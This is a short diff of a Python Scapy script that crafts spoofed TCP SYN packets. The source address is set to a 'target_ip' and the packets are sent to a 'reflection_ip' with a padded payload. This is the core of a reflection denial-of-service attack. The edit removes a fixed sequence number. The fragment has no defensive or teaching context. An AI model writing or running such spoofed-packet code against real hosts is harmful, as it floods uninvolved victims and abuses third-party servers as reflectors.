@@ -7,7 +7,7 @@ reflection_ip = "192.168.2.1"
 data = "BBBB"
 
 ip = IP(src=target_ip, dst=reflection_ip)
-tcp = TCP(sport=RandShort(), dport=int("443"),flags="S",seq=12345)
+tcp = TCP(sport=RandShort(), dport=int("443"),flags="S")
 raw = Raw(data*1024)
 scapy_packet = ip / tcp / raw
 
